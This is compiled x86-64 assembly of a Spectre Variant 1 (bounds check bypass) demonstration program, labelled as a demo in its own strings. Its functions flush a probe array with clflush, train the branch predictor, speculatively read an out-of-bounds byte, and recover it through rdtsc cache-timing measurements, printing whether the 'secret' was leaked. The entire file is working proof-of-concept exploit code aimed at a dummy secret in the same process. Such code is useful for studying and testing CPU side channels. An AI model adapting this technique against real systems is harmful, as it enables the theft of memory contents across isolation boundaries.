	.file	"spectre_1.c"
	.text
	.comm	probe_array,16384,32
	.globl	flush_probe_array
	.type	flush_probe_array, @function
flush_probe_array:
.LFB4262:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	$0, -12(%rbp)
	jmp	.L2
.L3:
	movl	-12(%rbp), %eax
	sall	$6, %eax
	cltq
	leaq	probe_array(%rip), %rdx
	addq	%rdx, %rax
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rax
	clflush	(%rax)
	nop
	addl	$1, -12(%rbp)
.L2:
	cmpl	$255, -12(%rbp)
	jle	.L3
	mfence
	nop
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4262:
	.size	flush_probe_array, .-flush_probe_array
	.type	rdtsc, @function
rdtsc:
.LFB4263:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	rdtsc
	salq	$32, %rdx
	orq	%rdx, %rax
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4263:
	.size	rdtsc, .-rdtsc
	.globl	measure_access_time
	.type	measure_access_time, @function
measure_access_time:
.LFB4264:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$40, %rsp
	movq	%rdi, -40(%rbp)
	movl	$0, %eax
	call	rdtsc
	movq	%rax, -16(%rbp)
	movq	-40(%rbp), %rax
	movzbl	(%rax), %eax
	movb	%al, -17(%rbp)
	mfence
	nop
	movl	$0, %eax
	call	rdtsc
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rax
	subq	-16(%rbp), %rax
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4264:
	.size	measure_access_time, .-measure_access_time
	.globl	benign_target
	.type	benign_target, @function
benign_target:
.LFB4265:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4265:
	.size	benign_target, .-benign_target
	.globl	common_init
	.type	common_init, @function
common_init:
.LFB4266:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movl	$16384, %edx
	movl	$0, %esi
	leaq	probe_array(%rip), %rdi
	call	memset@PLT
	movl	$0, -4(%rbp)
	jmp	.L11
.L12:
	movl	-4(%rbp), %eax
	cltq
	leaq	probe_array(%rip), %rdx
	movb	$1, (%rax,%rdx)
	addl	$64, -4(%rbp)
.L11:
	cmpl	$16383, -4(%rbp)
	jle	.L12
	mfence
	nop
	movl	$0, %eax
	call	flush_probe_array
	mfence
	nop
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4266:
	.size	common_init, .-common_init
	.section	.rodata
.LC0:
	.string	"Measuring cache timings..."
	.align 8
.LC1:
	.string	"Leaked %s (speculatively): %c (ASCII %d), Access Time: %lld cycles\n"
	.align 8
.LC2:
	.string	"SUCCESS! Leaked the actual %s.\n"
	.align 8
.LC3:
	.string	"LEAKED VALUE DOES NOT MATCH ACTUAL %s.\n"
	.align 8
.LC4:
	.string	"No %s leaked or could not detect leakage.\n"
	.text
	.globl	perform_measurement
	.type	perform_measurement, @function
perform_measurement:
.LFB4267:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$64, %rsp
	movl	%edi, %eax
	movq	%rsi, -64(%rbp)
	movb	%al, -52(%rbp)
	leaq	.LC0(%rip), %rdi
	call	puts@PLT
	movl	$-1, -36(%rbp)
	movq	$-1, -24(%rbp)
	movl	$50, -28(%rbp)
	movl	$0, -32(%rbp)
	jmp	.L14
.L17:
	movl	-32(%rbp), %eax
	sall	$6, %eax
	cltq
	leaq	probe_array(%rip), %rdx
	addq	%rdx, %rax
	movq	%rax, -16(%rbp)
	movq	-16(%rbp), %rax
	movq	%rax, %rdi
	call	measure_access_time
	movq	%rax, -8(%rbp)
	movl	-28(%rbp), %eax
	cltq
	cmpq	%rax, -8(%rbp)
	jge	.L15
	cmpq	$-1, -24(%rbp)
	je	.L16
	movq	-8(%rbp), %rax
	cmpq	-24(%rbp), %rax
	jge	.L15
.L16:
	movq	-8(%rbp), %rax
	movq	%rax, -24(%rbp)
	movl	-32(%rbp), %eax
	movl	%eax, -36(%rbp)
.L15:
	addl	$1, -32(%rbp)
.L14:
	cmpl	$255, -32(%rbp)
	jle	.L17
	cmpl	$-1, -36(%rbp)
	je	.L18
	movl	-36(%rbp), %eax
	movsbl	%al, %edx
	movq	-24(%rbp), %rsi
	movl	-36(%rbp), %ecx
	movq	-64(%rbp), %rax
	movq	%rsi, %r8
	movq	%rax, %rsi
	leaq	.LC1(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movzbl	-52(%rbp), %eax
	cmpl	%eax, -36(%rbp)
	jne	.L19
	movq	-64(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC2(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$1, %eax
	jmp	.L20
.L19:
	movq	-64(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC3(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$0, %eax
	jmp	.L20
.L18:
	movq	-64(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC4(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$0, %eax
.L20:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4267:
	.size	perform_measurement, .-perform_measurement
	.globl	public_array
	.data
	.align 16
	.type	public_array, @object
	.size	public_array, 16
public_array:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.globl	secret_data_v1
	.type	secret_data_v1, @object
	.size	secret_data_v1, 1
secret_data_v1:
	.byte	83
	.globl	g_vulnerable_array_v1
	.section	.data.rel.local,"aw"
	.align 8
	.type	g_vulnerable_array_v1, @object
	.size	g_vulnerable_array_v1, 8
g_vulnerable_array_v1:
	.quad	public_array
	.globl	g_vulnerable_array_size_v1
	.data
	.align 8
	.type	g_vulnerable_array_size_v1, @object
	.size	g_vulnerable_array_size_v1, 8
g_vulnerable_array_size_v1:
	.quad	16
	.text
	.globl	speculative_read_v1
	.type	speculative_read_v1, @function
speculative_read_v1:
.LFB4268:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -24(%rbp)
	movq	g_vulnerable_array_size_v1(%rip), %rax
	cmpq	%rax, -24(%rbp)
	jnb	.L23
	movq	g_vulnerable_array_v1(%rip), %rdx
	movq	-24(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	movb	%al, -1(%rbp)
	movzbl	-1(%rbp), %eax
	movzbl	%al, %eax
	sall	$6, %eax
	cltq
	leaq	probe_array(%rip), %rdx
	movb	$1, (%rax,%rdx)
.L23:
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4268:
	.size	speculative_read_v1, .-speculative_read_v1
	.section	.rodata
	.align 8
.LC5:
	.string	"\n--- Running Spectre Variant 1 (Bounds Check Bypass) Demo ---"
.LC6:
	.string	"Training branch predictor..."
	.align 8
.LC7:
	.string	"Attempting to leak secret data from OOB index %zu...\n"
.LC8:
	.string	"Spectre V1 secret"
.LC9:
	.string	"Actual secret data: %c\n"
	.text
	.globl	main_spectre_v1
	.type	main_spectre_v1, @function
main_spectre_v1:
.LFB4269:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movl	$0, %eax
	call	common_init
	leaq	.LC5(%rip), %rdi
	call	puts@PLT
	leaq	.LC6(%rip), %rdi
	call	puts@PLT
	movl	$0, -12(%rbp)
	jmp	.L25
.L26:
	movl	-12(%rbp), %eax
	cltq
	movq	g_vulnerable_array_size_v1(%rip), %rcx
	movl	$0, %edx
	divq	%rcx
	movq	%rdx, %rax
	movq	%rax, %rdi
	call	speculative_read_v1
	addl	$1, -12(%rbp)
.L25:
	cmpl	$999, -12(%rbp)
	jle	.L26
	mfence
	nop
	movl	$0, %eax
	call	flush_probe_array
	lfence
	nop
	movq	g_vulnerable_array_v1(%rip), %rax
	leaq	secret_data_v1(%rip), %rdx
	subq	%rax, %rdx
	movq	%rdx, %rax
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC7(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	-8(%rbp), %rax
	movq	%rax, %rdi
	call	speculative_read_v1
	lfence
	nop
	movzbl	secret_data_v1(%rip), %eax
	movzbl	%al, %eax
	leaq	.LC8(%rip), %rsi
	movl	%eax, %edi
	call	perform_measurement
	movzbl	secret_data_v1(%rip), %eax
	movzbl	%al, %eax
	movl	%eax, %esi
	leaq	.LC9(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$0, %eax
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4269:
	.size	main_spectre_v1, .-main_spectre_v1
	.ident	"GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	 1f - 0f
	.long	 4f - 1f
	.long	 5
0:
	.string	 "GNU"
1:
	.align 8
	.long	 0xc0000002
	.long	 3f - 2f
2:
	.long	 0x3
3:
	.align 8
4:
